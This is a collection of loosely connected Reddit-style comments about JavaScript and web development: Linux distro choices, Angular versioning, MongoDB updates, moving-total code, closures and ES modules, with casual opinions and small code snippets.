ubuntu or mint TBH the main issue is what @skitch920 mentioned i.e. which desktop env you want to use with your linux distro. Pick your distro based on release cycle / what tools it comes with and then choose your desktop env. There'll be different criteria for choosing which one you want to use. If you wanna show off, KDE is probably your best bet with the most eyecandy (plasma 5). Personally im a fan of minimalism so i stick with the more performance oriented ones such as : - MATE (gnome2 fork) - XFCE - LXQt Unity is most likely the one you've seen if you've watched any tutorials with ubuntu in it. Cinnamon is a nice balance between performance / eyecandy. If you're coming from a mac background pantheon might be a good transition for you (via [elementaryOS](https://elementary.io/), just enter 0 in the custom box). This article will give you more info : http://www.tecmint.com/best-linux-desktop-environments/
I tried out OneDrive, Google drive, and Dropbox. If you're using a Mac, the Google drive app sucks. It lags and causes your entire computer to freeze. One drive didn't sync across computers well. Dropbox works like a charm. 
Arch is yummy one you get into Linux a bit. Otherwise Ubuntu out or mint. If you're just in the shell, centos is what a lot of servers are on. Also if you like docker for everything, core os is good too.
I dig ubuntu
&gt; Now in your mind replace Redux by Doctrine or any other DB lib. This is a nonsense comparison. Redux is a method for managing state while Doctrine is a method of managing relational storage. The two have wildly different philosophies and solve different problems.
The js [garden](http://bonsaiden.github.io/JavaScript-Garden/).
Its a setup. I made it unbeatable. What do you think shall I let users win?
Just use Webstorm 
As a riot user waiting on riot 3 for es6 syntax goodness in a template engine that won't alienate my colleges. This looks really seducing. 
Nice.
Agreed. Is there any technical reason why it could not exist?
I don't know if jq can work in the browser. Certainly the JavaScript filter would work.
https://stedolan.github.io/jq/
&gt; but a matter of learning Backbone.js, Angular, Flexbox, React, Ember, Web Animations, Bootstrap, Express.js, Rails, jQuery, Sass, Node.js You don't have to learn any of that... except likely Node. If any employer tells you this certain framework knowledge is required you can always go work somewhere else. Senior developers are in demand. Seriously... if this is what you are stressing over then this probably isn't the right job for you. &gt; And you know what? This is on top of actually building the website whilst dealing with browser inconsistencies, different screen sizes, and accessibility This was true several years ago, but now most developers only test stuff out in Chrome and completely forget accessibility is actually a thing. Something like 70% of developers now use Chrome exclusively and hope things like frameworks and jQuery solve all the browser problems for them. Once you get past being a newb, presuming you don't fall into the framework stupidity, this becomes the standard. Its not hard. Its just part of the routine. &gt; So when you just learned one piece of technology, what do you learn next? Stop crying about the tooling and go write applications. If you want to actually learn technology and solve hard problem then go write software that solves real world problems.
The Angular2 values are a little misleading given how tree shaking and aot compile are baked into the CLI. Also, why would anyone concerned about size include `Rx` and not use modular imports?
Yeah, I basically agree with your critique of this. With the 1000s of articles out there on web development churn, this is one of the least useful articles I've ever read. This is essentially one paragraph that's half-filled with complaints. Every single person doesn't have to write an article about the pace of web development. Stop wasting time writing articles like this and just write code.
Lol wut three.months. you could prototype most of these front end tools yourself in less time than that.
So I have a site built and it's really simple. I wouldn't be selling much more than 10 products and probably don't need something complex. Also with Shopify I have to pay monthly right? That's what I'm trying to avoid if possible. I'm ok with them taking some off the top but I'm not in a position to be paying monthly.
&gt;but with a direct tier up strategy from Ignition to TurboFan for features that Crankshaft cannot deal with (i.e. **try-catch/-finally, eval, for-of, destructuring, class literals, etc.**) Pending proper user testing this sounds ludicrously fast.
Crosspost from r/programming, someone in JSConf.asia sugggested that this might also be an appropriate sub. :-)
I don't understand the "with Github pages" portion of the submission title. I looked at the code and I follow how the urls are shortened, but I don't see the connection between shortening it onto the https://u.ant.design domain and GitHub pages. Can anyone enlighten me?
Archlinux w/ Openbox
&gt;➜ u.ant.design git:(gh-pages) npm run generate https://www.alipay.com &gt;https://www.alipay.com ==shorten=&gt; http://u.ant.design/987c5dc &gt;URLs had been shortened, please commit and push it to GitHub! Someone doesn't know what "shortened" means. Also: MD5? Why?
Thanks for the link!
Thanks!
Maybe because A2 folks don't exactly advertise it? Or do they have a page outlining the sizes of their modules, the minimum size for a "hello world" app, and advices how the size can be reduced? Angular 1 landing page had 4 fully functional apps to inspire people to get up and running, if you want to know their secret why they got so popular ;) Angular 2 landing page is 100% marketing fluff. Not the best way to make me love them: https://www.quora.com/Which-one-should-I-learn-Angular-1-x-or-2-0/answer/Dmitri-Zaitsev?srid=hzKg
https://github.com/ant-design/u.ant.design#build-your-own-url-shortener
Just because MD5 is the most simple way to make a short and unique id for URL.
Im no mongo dev.. Edit: the third parameter for Findoneandupdate.. try passing ` {returnNewDocument: true}`, this should refetch (ehh...) the record with the new count Findoneandupdate implies running a query for 1 record, but you have no query search params, ex it's not sure what record to find, or isn't finding one at all... this would cause a similar problem potentially. Looking at the mongoose docs, The first parameters to f1update, is search terms, the 2nd parameters is update values, passing empty object `{}` as the first parameter will give you the wrong record (the first row of the collection), passing nothing is.. undefined behavior. Try this, apologies if you already have. db.scores.findOneAndUpdate( { "name" : "A. MacDyver" }, { $inc : { "points" : 5 }}, {returnNewDocument : true}).exec...., Maybe if the code you posted isn't the whole thing, var `bkyes` is overwritten somewhere, I noticed you use the same var name for your callbacks as your book name. Ex `bkyes.query (function(err,bkyes){})..`
&gt; Or do they have a page outlining the sizes of their modules, the minimum size for a "hello world" app, and advices how the size can be reduced? [aot compilation](https://angular.io/docs/ts/latest/cookbook/aot-compiler.html) [more advanced production build](http://blog.mgechev.com/2016/07/21/even-smaller-angular2-applications-closure-tree-shaking/) Something along the lines of the "advanced production build" will be abstracted into the `CLI` at some point. I didn't find your Quora post insightful. Component selector naming conventions follow web component conventions, and the question of whether A2 template syntax will become native seems naive at best. I mean if you don't even want (or embrace) `import` statements, then I'm sure that A2 is not the framework for you -- not that there is anything wrong with that. 
http://jqplay.org
Nice, very clever. Just switched over to VS Code after 5 years of Sublime :(
Hasn't riot 3 been released?
You choose a design pattern based on the specific problem you are trying to solve and since a program often has many different problems it needs to solve many different patterns will be employed. Without very specific details of what you're trying to do we can't make suggestions about how you could do it.
You don't really need to get caught up in "what design pattern should I choose". Instead, ask yourself, "what problems do I need to solve, and how do I solve them?" Design patterns will kind of come naturally, you'll end up using some pattern without even knowing it. If you have a particular problem that you're really unsure about, or maybe it's not as nice of a solution as you wanted, then you can look up patterns or other solutions for *that* particular issue. EDIT: Who are the idiots downvoting OP for asking questions?
Not afaik edit: it actually is ! since the 22! edit2: It looks awesome ! I don't understand why people don't talk more about riot. It feels like the ONE non-insane framework caught up in flying off the handle redefinition of everything. Choo also looks awesome but we're invested in riot at work, we have 3 full components build on it. 
Yes! But I am new in JavaScript and when I see Github JavaScript project, that is kind of hmmmmm, what is this?! I can not understand them! But I wrote codes in other languages and I think I can do it in JS too Should I dive into coding JS? I am worry if my library sucks with dumb codes without a design pattern
If you pick a design pattern first then you have a solution looking for a problem. In other words, you're doing it backwards. Lay out your project, break it up into components, and figure out how to solve the problems of each component. Whether you need to use a design pattern to solve those problems is to be determined later.
Google moves to semver for Angular.
OK, as I said before I am new in JS, and thanks for your help. Let's make it easy, you mean: I have to try to write my API (my open-source) using very damn simple functions and when it I did something cool, then I should try to put those codes in a design pattern. Right? But I see almost all projects started by a design pattern! I don't know how JS developers really work. Thanks 
If you're new to JS (or coding in general) then I should put even more emphasis on forgetting about design patterns. Design patterns are just ways to structure code to solve a *specific problem*. You can't just say, "I want to start a new project using X pattern". What is the project you want to start?
Made a little jobs board to test my Node/Express out https://wehire.io/ :)
We are talking about API changes. The analyzer will notify you if signatures/types don't match or if methods/fields/constants/etc don't exist.
I'm a web developer who has been using Linux for over a decade (I started in 2000), and in that time I've used a lot of distros (Mandrake, Gentoo, Red Hat, Debian, Ubuntu, and Mint). There's a lot of "Ubuntu or Mint" comments here; my advice, go with Mint. Ubuntu *used* to be the darling of the Linux community, but the reason many now recommend Mint is that Ubuntu's creator, Mark Shuttleworth, has taken a very Steve Jobsian approach to managing the distro. Which is to say, it's his way or the highway, and the community be damned. Unity was a perfect example of this: Ubuntu embraced Unity and made it the standard windows manager long before it was ready, and as a result a lot of Ubuntu users got burned when they tried to use their favorite distribution, couldn't, and discovered that they weren't relevant to Shuttleworth. If you're fine with putting your faith in Shuttleworth there's nothing wrong with Ubuntu: it's still a solid distro. But the thing is, the Linux community is all about putting faith in "the people", not "one person". The Linux Mint team embraces the community, as evidenced by them offering several different versions of Mint rather than forcing a particular windows manager on you. If you go with Mint, you know that future versions are going to have the new things people have asked for ... not the new things the big guy at the top has decided they should have.
No different than the breaking changes between angular 1.3 and 1.4
I've no problem with the versioning, you do whatever makes sense (except their previous trick of calling alphas RC) but it makes no sense in relation to Angular 1, they really should have called it something else.
Sorry, I didnt forget about this, but it seems like I failed to save my actual approach since I was trying different things and at the end, messed it up completely. My application works now! Thanks a lot for the support!
... when you are flabbergasted when another programming language doesn't have object literal syntax
...when you're surprised you can't pass functions around like variables
...when you forget not all interpreted languages hoist functions (looking at you fucking python)
Sounds like you want a moving average (or rather, a moving total)? If your data looks like: var a = [ { time: 1480190419000, value: { /* your object here */ } }, { time: 1480190276000, value: { /* your object here */ } }, /* etc... */ ]; Then your total could be summed like so: var now = new Date.getTime(); var oneHour = 1000 * 60 * 60; // ms * sec * min var minTime = now - oneHour; perHour = a .filter(function(el) { return el.time &gt; minTime; }) .reduce(function(sum, el) { return sum++; }, 0); I broke up the code liberally for clarity. Your array is a list of objects with both a value and a timestamp. The first part of your logic is to filter anything older than one hour ago. That's the result of the filter function. The next step is to add 1 for each object you're left with (e.g. `sum++` or "increment the sum variable by 1"). If the object itself was a numeric value and you wanted a sum rather than a count, you could do perHour = a .filter(function(el) { return el.time &gt; minTime; }) .reduce(function(sum, el) { return sum += el.value; }, 0); With ES6, you can write much cleaner code such as perHour = a.filter(el =&gt; el.time &gt; minTime) .reduce((sum,el) =&gt; sum++); But that's an exercise for later. Also for consideration - cleaning up old elements. You might alter this code such that the result of your filter is assigned to the original array, thus automatically discarding older elements if you don't need them.
Thanks so much for the reply! I want to pass in a query parameter for the vote property, however that vote will change every time(increment by 1). Do you know how to just select the vote property and whatever the value is at the time? I was thinking an empty object like vote:{} but that doesn't seem to do it. That could very well be the problem as you've thoughtfully pointed out here. I will also give returnNewDocument a shot. 
Ah thanks for the explanation and the code! I am looking for a moving total in this case. Not an average. I feel like i wasnt even that wrong with my "plan" about an array in an array. Will see if i can make it! Thanks a lot! :)
I'm glad they started using semver, but that doesn't necessarily justify them making breaking changes so soon after release. 
Completely agree.
You could certainly do an array within an array instead of an array of objects as I showed. Using nested arrays, it might be: var a = [ [time, value], [time, value], [time, value], [time, value], [time, value] ]; var total = a.filter(function(a2) { return a2[0] &gt; oneHourAgo; }) .reduce(function(count, a2) { return count++; }, 0); Bonus: If you DO want to discard everything prior to the current hour automagically: var total = (a = a.filter(function(a2) { return a2[0] &gt; oneHourAgo; })) .reduce(function(count, a2) { return count++; }, 0); Assigning the return value from the filter function to the original array overwrites the original array with only the new filtered values. Putting the whole statement in parethesis ensures that the filtered result is the target of the reduce call.
Using an array of objects now. Already started working on my code! Just meant, that my thoughts were not as wrong as I thought. ;) Thanks again. Have a nice day!
We have explained and documented this policy here, for those who are interested: http://angularjs.blogspot.com/2016/10/versioning-and-releasing-angular.html
Hence "typically". Anyhow, for the most part, you can introduce breaking changes with tooling in mind. Dart's standard lib was updated like that, for example. Updating Dart codebases was much easier than, say, making sure that some JS app continues to work fine with a new jQuery version.
jAvasCriPt
...when PHP literal arrays looks like an array of flattened arrow functions
Most modern languages can do that (at least the ones I use)
thank you for coming in here and demonstrating your knowledge. it makes the lighthearted joke thread way more fun for everyone who isn't you.
When you compare two strings with ===. I was shocked why my Cordova plugin not working for days.
If you're new to linux, I would suggest [Linux Mint Cinnamon](https://www.linuxmint.com/download.php) edition
Java 6 can't do it and all Android development is all Java 6... 
That's when you know you have done too much ES5, and it's time to install babel :D
There's no intellisense though!
I tried to compile something for Android yesterday and it kept giving me an error that Java 8 wasn't installed. So, no.
Yes they are. But the awesomeness of closures isn't that we can pass them around like variables. We could already do that with plain functions. The awesomeness of closures is that they "remember" things. They let a function be stateful.
...when you discover that your text editor can only handle 65,536 characters on one line!
Android doesn't support Java 8, only 6 or 7. Your error message was for a different reason
Does support a subset of 8 https://developer.android.com/guide/platform/j8-jack.html
What benefit is there for most devices to connect to the internet? It seems like you're just opening yourself up for hacks or exploitation with little to no return. 
This seems to indicate you can use java 8 https://developer.android.com/guide/platform/j8-jack.html
I don't know JS well, but that just sounds like static (inside functions) in C/C++.
Close. :-) In C++, a closure is a function object. That is, an instance with an `operator()`. So it's stateful in the same way that any object is stateful, but it's also callable like it was a function.
when you'd prefer to write it in clojurescript
C++11 actually has lambdas and closures now.
How do you manage a full rewrite in SemVer, then? Or do you just plain don't?
Thank you, I updated the code with your correction.
I think atm there is no way to do this in Android development with Java 7 (unless my knowledge is outdated), We still need to define a new class that inherits certain interface with certain methods just for a callback.
You follow facebook's lead and bump it 15 versions 
I love how instead of giant monolithic libraries we're getting component libraries like this, Element, Blueprint etc. They seem to be incredibly modular as well meaning we can tak what we need and discard the rest in our js building process. Awesome! Edit: But I have to ask, where are all these Chinese component libraries getting their inspiration from? They look so similar even down to the animations of the select boxes. If there's an original inspiration, I'd rather use THAT component library.
Most python developers I know spend their time in the REPL
Syntax candy?
Who cares so long as it works seamlessly for the user?
Thank you. This whole thread has been extremely ridiculous.
Thank you for being passive-aggressive. It makes the rest of us feel better about ourselves.
Again, agreed.
New dev and I didn't know you have to send back a status or else the browser will just build up pending requests. Ignorance I know but hopefully this helps someone. Modified POST request code: app.post('/bkyes', function(req, res, next) { bkyes.update({$inc: { vote: 1 }}) .exec(function(err, foundObject) { if (err) { console.log(err); }}); res.status(200).send(); });
haha yep. This has now thrown me off when i'm switching back and forth between them.
Just wanted to clarify. I think it's important to know how things work "under the hood"/are implemented. I love C++11(+) and all the things it adds myself.
This is why we should adopt := for assignment
Would be nice to have this with some stuff for Express/Koa/backend development stuff in general
...when you try to write a dict/hash/map literal in a different language without quoting the keys and get a syntax error.
It is just a simple project that I want to learn more JS by writing it because open-source is something else and can teach you more. It is a simple API with may simplify and add some more functions (I mean mathematically make it simple) to WebGL Then as you suggested I just will start writing my simple codes in different functions and when I am done with my functions I can chose a pattern for it / I hope the old and simple style JS does not suck in open-source world
Thanks. Then I should start writing simple Js and the pattern will jump out on me
You pick a different name, because that's not the same project.
Has also an optional Yeoman generator to make setting up endpoints easy as breezy: https://github.com/micromata/generator-http-fake-backend
Implementing them is a lot of work, especially figuring out the module loader API, which has to work both synchronously and asynchronously. AFAIK, work is still ongoing and progress is being made. For example, at a recent TC39 meeting, most (all?) remaining issues for Node.js were solved.
Pretty solid pattern with Angular 2 services. 
Yes, and it works good. In an app I'm building, I'm using parsley js for certain validation that needs to live in the DOM, and validator.js for those non-DOM cases. You can use both.
experience: tried it out for a sum total of about 2 hours seems pretty cool but the syntax for elements is really funky and kinda hard to read when nesting. div [] [ header [] [ h1 [] [] ] ] kinda got hung up on how the language itself is meant to interact with the existing javascript ecosystem (a la npm).
AFAIK you should write it like this : div [] [ header [] [ h1 [] [] ] ] 
Made a small library to find paths to primitive types: https://github.com/vivekimsit/primitive-path
Yeah. A good summary of the problem can be found in [James Snell's article](https://hackernoon.com/node-js-tc-39-and-modules-a1118aecf95e) on the September meeting of TC39. Even after reading it, I still am left wondering why Node has such a problem. The issue of dependency resolution in an an environment that allows circular dependency is specifically dealt with in [the ES2017 spec](https://tc39.github.io/ecma262/#sec-resolveexport) and that pattern is not terribly different from how AMD libraries like [Require told you to deal with them](http://requirejs.org/docs/api.html#circular) five years ago. Plus Babel lets you do it right now without complaint. From my comfy armchair, it strikes me as being a solved problem.
Actually. MS Edge has implemented it, but it is hidden behind the experimental javascript toggle. The feature request for chrome is also quite active, so I wouldn't say that it's completely been left out in the cold.
What makes me much more uncomfortable about SQL is how liberal it is about what I'd expect to be reserved words. "Oh, do you want a table called "values"? I'm sure we can sort that out without requiring any quotes."
&gt;SQL makes me deeply uncomfortable. FTFY
Why would using it have any effect on how you write the name out?
Hmm...I'm just wondering as this statement was in the 70-480 exam reference, but I don't understand what it means? The question was misleading: Which of following is NOT an attribute of an anon function? A) can't be called by any other code B) have a clearly defined name C) can be passed as parameters D) can't be assigned to a Dom element declaratively I would have expected the answer to be B...as in having a defined name is not an attribute of an anon function (which is true). But according to the book the answer is D.